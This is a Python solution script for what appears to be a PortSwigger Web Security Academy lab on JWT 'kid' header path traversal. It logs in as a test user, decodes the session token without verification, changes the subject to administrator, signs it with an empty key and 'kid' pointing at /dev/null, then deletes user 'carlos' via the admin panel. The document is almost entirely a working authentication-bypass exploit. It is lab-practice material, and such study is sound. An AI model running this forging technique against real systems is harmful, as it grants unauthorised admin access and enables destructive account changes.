'''
This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
'''

import jwt
import json
import requests
import uuid
from bs4 import BeautifulSoup
from jwcrypto import jwk


proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0ad600fb03db841680c40cc200e400ef.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# login
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# get JWT session cookie
session_cookie = s.cookies.get('session')
jwt_payload = jwt.decode(session_cookie, options={'verify_signature':False})

jwt_payload['sub'] = 'administrator'

# generate admin token
symmetric_key = ""
jwt_headers = {
    "kid": "../../../../../dev/null",
    "typ": "JWT",
    "k": symmetric_key,
    "alg": "HS256"
}

admin_token = jwt.encode(jwt_payload, symmetric_key, algorithm='HS256', headers=jwt_headers)

# update session_cookie to have jku param
s.cookies.set('session', admin_token)

# delete carlos
payload = {'username':'carlos'}
s.get(f"{url}/admin/delete", params=payload)